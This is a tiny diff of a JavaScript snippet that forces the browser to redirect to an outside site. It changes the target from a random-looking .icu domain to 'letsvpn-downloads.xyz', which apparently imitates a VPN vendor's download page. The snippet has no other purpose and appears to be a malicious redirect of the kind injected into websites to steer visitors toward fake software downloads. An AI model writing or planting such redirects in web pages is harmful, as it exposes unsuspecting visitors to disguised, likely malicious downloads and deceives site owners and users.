@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://lvsidjeraz.icu/';
+    window['location'] = 'https://letsvpn-downloads.xyz';
 })();
